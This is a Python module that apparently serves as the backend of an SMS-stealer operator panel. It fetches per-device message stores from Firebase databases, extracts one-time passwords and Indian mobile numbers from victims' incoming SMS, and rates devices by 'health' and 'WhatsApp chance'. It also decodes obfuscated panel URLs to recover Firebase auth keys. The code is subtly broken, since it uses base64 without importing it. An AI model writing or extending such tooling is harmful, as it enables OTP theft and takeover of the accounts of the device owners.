"""
Firebase Realtime Database service with proper error handling, retries, and timeouts.
"""
import asyncio
import json
import logging
import re
import time
from dataclasses import dataclass
from datetime import datetime, timedelta
from typing import Any, Optional
import aiohttp
from utils.retry import retry_async, POLICIES, RetryError
import constants as C

log = logging.getLogger("Firebase")


@dataclass
class FirebaseConfig:
    """Firebase service configuration."""
    default_timeout: int = C.Timeouts.FIREBASE_REQUEST
    long_timeout: int = C.Timeouts.FIREBASE_LONG_REQUEST
    max_concurrent: int = C.Limits.MAX_CONCURRENT_FIREBASE_CHECKS


class FirebaseError(Exception):
    """Base exception for Firebase errors."""
    pass


class FirebaseTimeoutError(FirebaseError):
    """Firebase request timed out."""
    pass


class FirebaseNotFoundError(FirebaseError):
    """Requested data not found (null/404)."""
    pass


class FirebaseService:
    """
    Firebase Realtime Database service with:
    - Configurable timeouts
    - Retry with exponential backoff
    - Proper error types
    - Connection pooling via aiohttp ClientSession
    """

    def __init__(self, cfg: Optional[FirebaseConfig] = None):
        self.cfg = cfg or FirebaseConfig()
        self._session: Optional[aiohttp.ClientSession] = None
        self._semaphore = asyncio.Semaphore(self.cfg.max_concurrent)

    @property
    def session(self) -> aiohttp.ClientSession:
        """Lazy-initialize aiohttp session with connection pooling."""
        if self._session is None or self._session.closed:
            timeout = aiohttp.ClientTimeout(total=self.cfg.default_timeout)
            connector = aiohttp.TCPConnector(
                limit=20,
                limit_per_host=10,
                ttl_dns_cache=300,
                enable_cleanup_closed=True
            )
            self._session = aiohttp.ClientSession(timeout=timeout, connector=connector)
        return self._session

    async def close(self) -> None:
        """Close the HTTP session."""
        if self._session and not self._session.closed:
            await self._session.close()
            self._session = None

    async def _request(
        self,
        url: str,
        auth: Optional[str] = None,
        timeout: Optional[int] = None
    ) -> Any:
        """
        Make a GET request to Firebase with retry logic.
        Raises FirebaseError subclasses on failure.
        """
        full_url = url
        if auth and str(auth).strip() and str(auth) != "None":
            full_url += f"&auth={auth}" if "?" in full_url else f"?auth={auth}"

        request_timeout = timeout or self.cfg.default_timeout

        async def _do_request():
            async with self._semaphore:
                async with self.session.get(full_url, timeout=aiohttp.ClientTimeout(total=request_timeout)) as resp:
                    if resp.status == 404:
                        raise FirebaseNotFoundError(f"Firebase path not found: {url}")
                    if resp.status != 200:
                        raise FirebaseError(f"HTTP {resp.status}: {await resp.text()}")

                    txt = await resp.text()
                    if txt == "null" or not txt:
                        return {}
                    return json.loads(txt)

        try:
            return await retry_async(_do_request, policy=POLICIES["firebase"])
        except RetryError as e:
            last = e.last_exception
            if isinstance(last, asyncio.TimeoutError):
                raise FirebaseTimeoutError(f"Timeout after {e.attempts} attempts: {url}") from last
            if isinstance(last, FirebaseNotFoundError):
                raise
            raise FirebaseError(f"Failed after {e.attempts} attempts: {last}") from last

    # ==========================
    # Public API
    # ==========================

    async def fetch(self, path: str, auth: Optional[str] = None) -> Any:
        """
        Fetch data from a Firebase path.
        Returns parsed JSON or {} for null/empty.
        Raises FirebaseError on failure.
        """
        return await self._request(path, auth)

    async def fetch_shallow(self, path: str, auth: Optional[str] = None) -> dict:
        """Fetch only keys (shallow=true) for listing children."""
        shallow_path = f"{path}?shallow=true"
        return await self._request(shallow_path, auth)

    async def fetch_messages(
        self,
        base_url: str,
        dev_id: str,
        auth: Optional[str] = None,
        limit: int = 5
    ) -> dict:
        """Fetch recent messages for a device."""
        path = C.FirebasePaths.messages_for_device(dev_id, limit)
        full_url = f"{base_url}/{path}"
        return await self._request(full_url, auth)

    async def fetch_all_messages(
        self,
        base_url: str,
        dev_id: str,
        auth: Optional[str] = None,
        limit: int = 100
    ) -> dict:
        """Fetch more messages for deep analysis."""
        path = C.FirebasePaths.messages_full(dev_id, limit)
        full_url = f"{base_url}/{path}"
        return await self._request(full_url, auth)

    async def fetch_clients(self, base_url: str, auth: Optional[str] = None) -> dict:
        """Fetch all clients for a Firebase base."""
        return await self._request(f"{base_url}/clients.json", auth)

    async def check_ping(self, base_url: str, auth: Optional[str] = None) -> str:
        """Check Firebase connectivity and return latency."""
        start = time.time()
        try:
            await self.fetch_shallow(f"{base_url}/clients.json", auth)
            return f"{int((time.time() - start) * 1000)}ms"
        except FirebaseTimeoutError:
            return "❌ Timeout"
        except FirebaseError as e:
            log.debug(f"Ping failed for {base_url}: {e}")
            return "❌ Error"

    # ==========================
    # Data Extraction (moved from firebase_utils.py)
    # ==========================

    @staticmethod
    def clean_mobile(raw: Any) -> Optional[str]:
        """Extract and validate Indian mobile number."""
        if not raw or not isinstance(raw, str):
            return None
        s = raw.strip().lower()
        if s in ('unknown', 'none', 'null', 'na', 'n/a', ''):
            return None
        d = C.PATTERNS["DIGITS_ONLY"].sub('', s)
        if len(d) == 12 and d.startswith('91'):
            d = d[2:]
        elif len(d) == 11 and d.startswith('0'):
            d = d[1:]
        if len(d) != 10 or d[0] not in '6789':
            return None
        return d

    @staticmethod
    def is_service_sender(sender: str) -> bool:
        """Check if sender is a service (shortcode/DLT/alphanumeric)."""
        if not sender:
            return True
        s = sender.strip()
        return bool(
            C.PATTERNS["SHORTCODE"].match(s) or
            C.PATTERNS["DLT_ID"].match(s) or
            C.PATTERNS["ALNUM_ID"].match(s)
        )

    @staticmethod
    def extract_otp(text: str) -> Optional[str]:
        """Extract OTP from message text using multiple patterns."""
        if not text:
            return None
        for pat in C.PATTERNS["OTP"]:
            m = pat.search(text)
            if m:
                return m.group(1)
        return None

    @staticmethod
    def extract_service_name(text: str, sender: str) -> str:
        """Detect service name from message text or sender."""
        text_lower = text.lower()
        for key, name in C.PLATFORM_DOMAIN_MAP.items():
            if key in text_lower:
                return name
        if sender and "-" in sender:
            return sender.split("-")[1]
        return "Unknown"

    @staticmethod
    def calculate_health(msgs: list) -> int:
        """Calculate device health score based on message recency."""
        if not msgs:
            return 1
        latest = 0
        now_ms = time.time() * 1000
        for m in msgs:
            ts = 0
            raw_id = m.get("id", 0)
            try:
                iv = int(raw_id)
                if iv > 10**12:
                    ts = iv
            except (ValueError, TypeError):
                pass
            if not ts and m.get("dateTime"):
                try:
                    ts = datetime.strptime(m["dateTime"], '%d-%m-%Y | %I:%M %p').timestamp() * 1000
                except (ValueError, TypeError):
                    pass
            if ts > latest:
                latest = ts

        if not latest:
            return 1

        age_h = (now_ms - latest) / 3_600_000.0
        for max_h, score in C.HEALTH_THRESHOLDS:
            if age_h < max_h:
                return score
        return 1

    @staticmethod
    def get_ws_chance(msgs: list) -> int:
        """Calculate WhatsApp chance based on recent WhatsApp messages."""
        ws_msgs = []
        now = time.time()
        for m in msgs:
            if not isinstance(m, dict):
                continue
            text = (m.get("message") or "").lower()
            sender = str(m.get("sender") or "").lower()
            if "whatsapp" in text or "whatsapp" in sender or "wa" in sender:
                ts = 0
                try:
                    iv = int(m.get("id", 0))
                    if iv > 10**12:
                        ts = iv / 1000
                except (ValueError, TypeError):
                    pass
                if ts:
                    ws_msgs.append(ts)

        if not ws_msgs:
            return 97

        latest_ws = max(ws_msgs)
        diff_hours = (now - latest_ws) / 3600

        for max_h, chance in C.WS_CHANCE_THRESHOLDS:
            if diff_hours < max_h:
                return chance
        return 97

    @staticmethod
    def extract_best_numbers(dev_data: dict, msgs: list) -> list[tuple[str, int]]:
        """
        Extract best candidate phone numbers from device data and messages.
        Returns list of (number, confidence) tuples sorted by confidence desc.
        """
        if not isinstance(dev_data, dict):
            dev_data = {}

        candidates: dict[str, int] = {}

        def bump(num: Optional[str], conf: int) -> None:
            if not num:
                return
            if candidates.get(num, -1) < conf:
                candidates[num] = conf

        # From device data
        bump(FirebaseService.clean_mobile(dev_data.get('mobNo')), 100)
        for sim in (dev_data.get('sims') or []):
            if isinstance(sim, dict):
                bump(FirebaseService.clean_mobile(sim.get('phoneNumber')), 100)

        # From messages
        if msgs:
            # Carrier patterns
            for m in msgs:
                if not isinstance(m, dict) or m.get('type') != 'incoming':
                    continue
                body = m.get('message', '') or ''
                for pat in C.PATTERNS["CARRIER"]:
                    for hit in pat.findall(body):
                        bump(FirebaseService.clean_mobile(hit), 100)

            # Frequency analysis of non-service senders
            freq: dict[str, int] = {}
            for m in msgs:
                if not isinstance(m, dict) or m.get('type') != 'incoming':
                    continue
                if FirebaseService.is_service_sender(m.get('sender', '')):
                    continue
                n = FirebaseService.clean_mobile(m.get('sender', ''))
                if n:
                    freq[n] = freq.get(n, 0) + 1

            for n, c in freq.items():
                bump(n, min(50 + c * 5, 95))

        return sorted(candidates.items(), key=lambda kv: (-kv[1], kv[0]))[:2]

    @staticmethod
    def get_ist_time_str(ts: int) -> str:
        """Format timestamp as IST string."""
        ist = datetime.utcfromtimestamp(ts) + timedelta(hours=5, minutes=30)
        return ist.strftime("%d %b %Y | %I:%M %p")

    @staticmethod
    def decode_panel_url(panel_url: str) -> Optional[tuple[str, str]]:
        """Decode obfuscated panel URL to extract Firebase URL and auth key."""
        match = C.PATTERNS["URL_BASE64"].search(panel_url)
        if not match:
            return None

        b64_str = match.group(1)
        try:
            b64_str += "=" * ((4 - len(b64_str) % 4) % 4)
            decoded = base64.b64decode(b64_str).decode('utf-8')

            if "|||" in decoded:
                parts = decoded.split("|||")
                return parts[0], parts[1] if len(parts) > 1 else ""

            try:
                data = json.loads(decoded)
                if isinstance(data, dict) and "url" in data:
                    return data["url"], data.get("key", "")
            except json.JSONDecodeError:
                if decoded.startswith("http"):
                    return decoded, ""
        except Exception:
            pass
        return None


# Global instance
_firebase_service: Optional[FirebaseService] = None


def get_firebase() -> FirebaseService:
    global _firebase_service
    if _firebase_service is None:
        _firebase_service = FirebaseService()
    return _firebase_service


# Backward compatibility functions (deprecated)
async def fetch_fb(url: str, auth: str = None):
    """Deprecated: Use get_firebase().fetch()"""
    import warnings
    warnings.warn("fetch_fb() is deprecated, use get_firebase().fetch()", DeprecationWarning, stacklevel=2)
    try:
        return await get_firebase().fetch(url, auth)
    except FirebaseError:
        return None


async def check_ping(url: str, auth: str = None):
    """Deprecated: Use get_firebase().check_ping()"""
    import warnings
    warnings.warn("check_ping() is deprecated, use get_firebase().check_ping()", DeprecationWarning, stacklevel=2)
    return await get_firebase().check_ping(url, auth)


# Re-export for backward compat
__all__ = [
    'FirebaseService', 'get_firebase', 'FirebaseError',
    'FirebaseTimeoutError', 'FirebaseNotFoundError',
    'fetch_fb', 'check_ping',
]